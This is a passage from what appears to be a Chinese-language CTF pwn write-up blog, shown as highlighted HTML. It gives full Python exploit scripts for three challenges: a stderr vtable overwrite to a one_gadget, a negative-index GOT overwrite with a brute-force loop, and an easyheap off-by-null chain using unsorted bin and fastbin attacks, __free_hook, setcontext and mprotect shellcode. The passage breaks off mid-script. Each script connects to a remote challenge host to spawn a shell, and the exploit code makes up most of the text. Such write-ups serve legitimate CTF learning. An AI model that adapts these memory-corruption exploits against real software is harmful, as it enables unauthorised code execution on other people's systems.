r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./secret'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'183.129.189.60'</span><span class="token punctuation">,</span> <span class="token number">10030</span><span class="token punctuation">)</span>
ctx<span class="token punctuation">.</span>remote_libc <span class="token operator">=</span> <span class="token string">'./libc.so'</span> <span class="token comment"># libc-2.29</span>
ctx<span class="token punctuation">.</span>debug_remote_libc  <span class="token operator">=</span> <span class="token boolean">True</span>

<span class="token comment">#rs()</span>
rs<span class="token punctuation">(</span><span class="token string">'remote'</span><span class="token punctuation">)</span>

ru<span class="token punctuation">(</span><span class="token string">'secret:'</span><span class="token punctuation">)</span>
printf <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'printf'</span><span class="token punctuation">,</span> printf<span class="token punctuation">)</span>

lbase <span class="token operator">=</span> printf <span class="token operator">-</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>

_IO_2_1_stderr_ <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span>
vtable <span class="token operator">=</span> _IO_2_1_stderr_ <span class="token operator">+</span> <span class="token number">0xd8</span>

leak<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">,</span> _IO_2_1_stderr_<span class="token punctuation">)</span>
leak<span class="token punctuation">(</span><span class="token string">'vtable'</span><span class="token punctuation">,</span> vtable<span class="token punctuation">)</span>


one1 <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0xe237f</span>
one2 <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0xe2383</span>
one3 <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0xe2386</span>
one4 <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x106ef8</span>

<span class="token comment">#dbg()</span>
<span class="token comment">#dbg('b *%s' % hex(one3))</span>
<span class="token comment">#raw_input()</span>
s<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>vtable<span class="token punctuation">)</span><span class="token punctuation">)</span>
s<span class="token punctuation">(</span><span class="token string">'\xf0\x70'</span><span class="token punctuation">)</span> <span class="token comment"># 修改vtable地址低两字节 </span>
s<span class="token punctuation">(</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one3<span class="token punctuation">)</span><span class="token punctuation">)</span>


irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Memory-Monster-IV"><a href="#Memory-Monster-IV" class="headerlink" title="Memory_Monster_IV"></a>Memory_Monster_IV</h2><p>根据Dockerfile得知环境使用ubuntu19，libc是2.30</p>
<p>漏洞是负数溢出改got表</p>
<p>write和一个one_gadget非常相近，只差两个字节</p>
<p>但每次只能写一个字节，要保证写了一个字节后，程序不会异常，可以调整one_gadget的低字节往前看看，是否有使得write的最低字节修改后有ret指令之类的</p>
<p>leak的话就利用给的execve，libc地址随机化最低的12位是固定为0的，利用这点，程序的随机数异或没啥用</p>
<p>整个过程中，stdout莫名其妙的被关闭了(可能和write有关)，getshell后执行<code>exec 1&gt;&amp;2</code>恢复输出</p>
<p>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./Memory_Monster_IV'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'183.129.189.60'</span><span class="token punctuation">,</span> <span class="token number">10033</span><span class="token punctuation">)</span>
ctx<span class="token punctuation">.</span>custom_lib_dir <span class="token operator">=</span> <span class="token string">'./lib'</span>
ctx<span class="token punctuation">.</span>debug_remote_libc <span class="token operator">=</span> <span class="token boolean">True</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment">#rs()</span>
        rs<span class="token punctuation">(</span><span class="token string">'remote'</span><span class="token punctuation">)</span>
        <span class="token comment"># print(ctx.libc.path)</span>

        <span class="token keyword">def</span> <span class="token function">write_byte</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> byte<span class="token punctuation">)</span><span class="token punctuation">:</span>
            sl<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
            sl<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>byte<span class="token punctuation">)</span><span class="token punctuation">)</span>


        execve_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">'in'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> 
        execve_addr <span class="token operator">=</span> execve_addr <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token operator">~</span><span class="token number">0xfff</span><span class="token punctuation">)</span>
        execve_addr <span class="token operator">=</span> execve_addr <span class="token operator">|</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xfff</span><span class="token punctuation">)</span>
        leak<span class="token punctuation">(</span><span class="token string">'execve'</span><span class="token punctuation">,</span> execve_addr<span class="token punctuation">)</span>

        lbase <span class="token operator">=</span> execve_addr <span class="token operator">-</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span>
        one <span class="token operator">=</span> lbase <span class="token operator">+</span> <span class="token number">0x10afa4</span>  <span class="token comment"># one_gadget=0x10afa9</span>
        write <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>
        leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span>
        leak<span class="token punctuation">(</span><span class="token string">'one'</span><span class="token punctuation">,</span> one<span class="token punctuation">)</span>
        leak<span class="token punctuation">(</span><span class="token string">'write'</span><span class="token punctuation">,</span> write<span class="token punctuation">)</span>


        arr_addr <span class="token operator">=</span> <span class="token number">0x5DE0</span>
        write_got <span class="token operator">=</span> <span class="token number">0x4018</span>
        write_byte<span class="token punctuation">(</span>write_got<span class="token operator">-</span>arr_addr<span class="token punctuation">,</span> one <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>
        write_byte<span class="token punctuation">(</span>write_got<span class="token operator">-</span>arr_addr<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>one <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">)</span>

        
        sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token string">'exec 1>&amp;2'</span><span class="token punctuation">)</span>
        sleep<span class="token punctuation">(</span><span class="token number">0.5</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token string">'ls flag'</span><span class="token punctuation">)</span>
        ru<span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span>
        
        irt<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">break</span>
    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
        <span class="token keyword">break</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>add处有个off-by-null<br><img src="/images/ff79dc8d/2.png" alt="upload successful"></p>
<p>大体思路是：</p>
<ol>
<li>off-by-null达到chunk overlap，之后leak出libc和heap的地址</li>
<li>同样操作，获得一个指向被free进unsorted bin里的指针,修改这个unsorted bin chunk的bk域，unsorted bin attack 到__free_hook-16的位置</li>
<li>之后就可以fastbin attack修改__free_hook成setcontext+53</li>
<li>然后就是mprotect，shellcode，orw一把梭</li>
</ol>
<p>open调用号被禁用了，用openat替代</p>
<p>测试发现远程环境是2.27，add功能使用的是calloc，不会从tcache分配，要先把tcache填满</p>
<p>exp:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>

<span class="token keyword">from</span> PwnContext <span class="token keyword">import</span> <span class="token operator">*</span>
      
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'gnome-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">]</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'info'</span>
<span class="token comment"># functions for quick script</span>
s       <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment">#in case that data is an int</span>
sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data               <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data         <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>delim<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span> 
r       <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">,</span> timeout<span class="token operator">=</span>timeout<span class="token punctuation">)</span>
ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims<span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span>  <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">,</span> drop<span class="token punctuation">)</span>
irt     <span class="token operator">=</span> <span class="token keyword">lambda</span>                    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
rs      <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
dbg     <span class="token operator">=</span> <span class="token keyword">lambda</span> gs<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs    <span class="token punctuation">:</span>ctx<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>gdbscript<span class="token operator">=</span>gs<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span>
<span class="token comment"># misc functions</span>
uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
leak    <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'&#123;&#125; = &#123;:#x&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

ctx<span class="token punctuation">.</span>binary <span class="token operator">=</span> <span class="token string">'./pwn'</span>
ctx<span class="token punctuation">.</span>remote <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'183.129.189.60'</span><span class="token punctuation">,</span> <span class="token number">10027</span><span class="token punctuation">)</span>
ctx<span class="token punctuation">.</span>remote_libc <span class="token operator">=</span> <span class="token string">'libc.so.6'</span> <span class="token comment"># libc-2.27</span>
ctx<span class="token punctuation">.</span>debug_remote_libc <span class="token operator">=</span> <span class="token boolean">True</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'index>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'size>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'name>> '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>
    

<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'index>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span> <span class="token string">'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'index>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    

<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">'Choice: '</span><span class="token punctuation">,</span> <span class="token string">'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'index>> '</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">'name>> '</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span>


<span class="token comment">#rs()</span>
rs<span class="token punctuation">(</span><span class="token string">'remote'</span><span class="token punctuation">)</span>

<span class="token comment"># 填满tchache</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0x160</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    dele<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

<span class="token comment"># leak</span>
<span class="token comment"># off-by-null覆盖chunk4的pre_inuse</span>
add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment"># top</span>

<span class="token comment">#dele(1)</span>
dele<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
dele<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

pay <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x60</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x1e0</span><span class="token punctuation">)</span> <span class="token comment"># pre_size</span>
add<span class="token punctuation">(</span><span class="token number">0x68</span><span class="token punctuation">,</span> pay<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>

<span class="token comment"># 根据pre_size=0x2e0会向前合并到#0</span>
dele<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>

<span class="token comment"># chunk0+chunk1，切割后在unsorted bin里的刚好由#2控制，可以leak </span>
